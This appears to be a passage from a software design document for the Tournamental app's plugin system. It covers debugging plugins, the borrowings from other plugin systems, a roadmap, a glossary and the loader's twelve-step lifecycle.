**Q: What happens if my plugin's manifest validation fails at boot?** The plugin is skipped and a log line + Sentry breadcrumb is emitted with the validation error message. The plugin picker UI shows the plugin with a "load failed" badge so users can diagnose. The rest of the app boots normally.

## Debugging a misbehaving plugin

When a plugin causes a user-visible bug, the diagnostic sequence:

1. **Disable it.** Settings → Plugins → toggle off. The core hot-reloads on toggle (renderer plugins remount; scorer plugins are picked at request time so no reload needed).
2. **Reproduce against the default.** If the bug only happens with your plugin, it's a plugin bug.
3. **Read your plugin's log lines.** Every `ctx.log.*` call is tagged with `pluginName`, filterable in the dev console.
4. **Run the test harness.** `runScorerAgainstFixture(myPlugin, fixtureBracket, fixtureResults)` reproduces the canonical input in isolation.
5. **File a bug.** Either against your own plugin's repo, or against the core if the bug is in the SDK boundary.

The plugin picker UI shows the last error per plugin so users can self-diagnose. Plugins that throw on more than 10% of `mount` / `score` / `start` calls in a sliding 24h window are auto-disabled by the core and the operator is paged; the plugin author gets an email if `author.email` is set.

## Prior art and trade-offs

The plugin architecture borrows from several systems. Naming the borrowings makes the trade-offs explicit.

**From Obsidian.** The "manifest + factory" shape (read JSON, dynamic-import, call factory) is Obsidian's pattern. Obsidian's pluginsare in-process JavaScript; same trust model as v0.1 here. Differs: Obsidian doesn't enforce a license allow-list, and doesn't have a Drips-style upstream revshare contract. We added both.

**From Figma.** Figma plugins run in a sandboxed iframe with a `MessageChannel` to the main app. That's the v1.0 target for renderer plugins. We're not there yet because the sandbox boundary costs perf (LCP, frame budget) and we'd rather ship reviewable in-process plugins now and tighten the sandbox later than ship sandboxed plugins that hit the frame budget and have to be loosened.

**From Webpack and Rollup.** Both have a `Plugin` interface with named lifecycle hooks. We deliberately rejected the "one big hook bag" shape in favour of multiple narrow capability interfaces because it's easier to type-check and easier to test. A plugin that wants to do five things provides five capabilities; the core sees five independent objects, not one mega-object with optional methods.

**From WordPress.** WordPress's "hooks" model (`add_action`, `add_filter`) allows arbitrary cross-plugin coupling. We rejected this. Plugin-to-plugin coupling silently widens the trust surface and makes capability-level reasoning impossible. If your renderer plugin needs scoring, it asks the core for the canonical scorer, not for another plugin's scorer.

**From Storybook.** Storybook's "preset" model bundles config + plugin code into one npm package, discoverable via naming convention. That's where the `@tournamental-plugin/*` scope auto-discovery comes from. The naming convention is enforced at the loader; arbitrary packages are NOT auto-loaded.

**Not borrowed: Chrome extensions.** Chrome's permissions UI is a great pattern but the extension lifecycle (background pages, content scripts, popup pages) is far too complex for our needs. v1.0 may revisit a worker-based isolation; v0.1 stays simple.

## Roadmap

Some things are deliberately NOT extension points until usage proves they should be.

### v0.1 (this doc): eight named extension points

The eight listed above. Each one has an interface in the SDK, a contract in this doc, and at least one built-in plugin shipping (the defaults under `packages/social-cards`, `packages/bracket-engine`, etc., become "the default plugin" implicitly).

### v0.2: scaffolder + plugin marketplace UI

- `pnpm create @tournamental/plugin <kind> <name>` becomes a real command.
- The web app gets a `/plugins` settings page listing every installed plugin, with enable/disable toggles, version info, and a "report a bug" link to the plugin's repo.
- The plugin loader gains a `pluginManifest.json` reverse-index: given a capability + match, the core can pick a plugin via a declarative rule set rather than ad-hoc URL flags.

### v0.4: tournament-format plugins

A `tournamentFormat` plugin lets a contributor define a non-standard knockout / round-robin / Swiss / double-elimination shape and the bracket-prophet UI adapts. Today the format is hardcoded for FIFA WC 2026 in [`packages/bracket-engine`](../packages/bracket-engine). Extension point added once we have 3+ tournaments live.

### v0.4: clip-recipe plugins

A `clipRecipe` plugin overrides the goal / save / shootout clip templates in [doc 14](14-clip-generation-and-social.md). Each plugin defines a `recipe(event, context)` returning ffmpeg filter graphs. Deferred until the clip pipeline ships its first 1000 published clips.

### v1.0: sandboxed plugin runtime

WASM / iframe / Worker sandboxing for at least `scorer` (WASM, pure function) and `renderer` (Worker with offscreen canvas). The transition is gated on real external contributor traffic; until then "trust on review" is sufficient.

### Deliberately not-yet extension points

- **Database schema.** Plugins can't add tables. If a plugin needs persistence beyond the `PluginContext.cache`, it stands up its own DB. Reason: data ownership and migrations get messy fast.
- **API routes.** Plugins can't register new HTTP routes on the core's API. They can ship their own service with their own routes. Reason: routing surface area is a security-critical commitment.
- **Auth flows.** Identity plugins extend WHICH provider users log in with; they don't extend the post-login session lifecycle. Reason: session crypto is core's responsibility.
- **Pay-out logic.** Affiliate plugins can route clicks; they can't run their own pay-out cycle. The Drips treasury is the only payout channel. Reason: securities-law clarity per [doc 19](19-open-source-and-contributor-revenue.md).

These may become first-class platform features eventually; they will not be plugin extension points.

## Glossary

| Term                 | Definition                                                                                                                                                                              |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Capability           | One of the eight named extension points (`renderer`, `scorer`, `ingestSource`, `identityProvider`, `commentaryProvider`, `shareCardRenderer`, `oddsSource`, `affiliateRouter`)          |
| Plugin               | An npm package that ships a `plugin.json` declaring one or more capabilities and a default-export factory the loader calls at boot                                                       |
| `PluginContext`      | The object the core passes to a plugin's factory: scoped logger, sandboxed fetch, per-plugin cache                                                                                       |
| `PluginFactory`      | The default export from a plugin's entry file. Takes a `PluginContext`, returns a `Plugin`                                                                                              |
| Capability interface | One of `RendererPlugin`, `ScorerPlugin`, etc. The shape a plugin implements for each capability it provides                                                                              |
| Manifest             | The validated `plugin.json` contents. See `pluginManifestSchema` in [`packages/plugin-sdk/src/manifest.ts`](../packages/plugin-sdk/src/manifest.ts)                                      |
| Loader               | The core's plugin-discovery + registration code. Lives in `apps/web/lib/plugins/loader.ts` (web) and `apps/api/src/plugins/loader.ts` (server); shares logic via `packages/plugin-sdk`   |
| Drips list           | The on-chain revenue-share registry from [doc 40](40-drips-network-integration.md). Plugins shipped in-monorepo are added to the upstream Drips list                                     |
| In-monorepo plugin   | A plugin whose source lives in `packages/plugins/*` in the official Tournamental repo. Eligible for the upstream Drips treasury automatically                                            |
| External plugin      | A plugin whose source lives in its own GitHub repo, published to npm under `@tournamental-plugin/*`. Opt-in to upstream Drips                                                            |
| Local-dir plugin     | A plugin loaded from the top-level `plugins/` directory rather than from `node_modules`. Used for development; not published to npm                                                       |

## Loader lifecycle

The loader's full lifecycle, in 12 numbered steps. Useful when debugging "why isn't my plugin loading?".

```
1.  App boot.
2.  Loader reads pnpm-workspace.yaml + scans node_modules for
    @tournamental-plugin/* matches.
3.  Loader scans plugins/ for local-dir plugins.
4.  For each candidate, in deterministic order (alphabetical by name):
5.    Read plugin.json. Parse JSON; reject on parse error.
6.    Validate against pluginManifestSchema. Reject on schema error.
7.    Check sdkRange against installed @tournamental/plugin-sdk version
      using semver.satisfies(). Skip + warn on mismatch.
8.    Check license against ALLOWED_LICENSES. Skip + warn on mismatch.
9.    Dynamic import the entry file (per `main`, defaulting to dist/index.js
      or index.ts). Catch import errors; record per-plugin.
10.   Call the default export with PluginContext. Catch factory errors;
      record per-plugin.
11.   Register the returned Plugin in the per-capability registry under
      the manifest's name.
12. App ready. Plugin picker UI reads the registry + per-plugin error log.
```

Boot is sequential per plugin but plugins are independent: a failure at any step (parse, schema, import, factory) records the error and continues to the next plugin. There's no "all-or-nothing" boot.

## Related docs

- [04, renderer](04-renderer.md): what the default renderer does and the perf budgets
- [16, game modes and scoring](16-game-modes-and-scoring.md): the canonical scoring formula a `scorer` plugin replaces
- [12, odds and predictions](12-odds-and-predictions.md): how the core blends multiple `oddsSource` plugins
- [18, monetization](18-monetization.md): what an `affiliateRouter` plugin slots into
- [19, open source and contributor revenue](19-open-source-and-contributor-revenue.md): Drips revshare and license framing
- [20, identity and humanness](20-identity-humanness-bots.md): how `identityProvider` plugins extend the auth picker
- [31, live commentary overlay](31-live-commentary-overlay.md): how `commentaryProvider` plugins drive audio
- [40, Drips Network integration](40-drips-network-integration.md): concrete Drips treasury setup

## File index

- SDK package: [`packages/plugin-sdk/`](../packages/plugin-sdk)
- SDK quickstart: [`packages/plugin-sdk/README.md`](../packages/plugin-sdk/README.md)
- Manifest schema: [`packages/plugin-sdk/src/manifest.ts`](../packages/plugin-sdk/src/manifest.ts)
- Test harness: [`packages/plugin-sdk/src/test-harness.ts`](../packages/plugin-sdk/src/test-harness.ts)
- Reference renderer plugin: [`packages/plugins/example-cel-shaded-renderer/`](../packages/plugins/example-cel-shaded-renderer)
- Starter prompt for an AI plugin author: [`AGENT-PROMPTS.md`](../AGENT-PROMPTS.md) section "Plugin Author Agent"
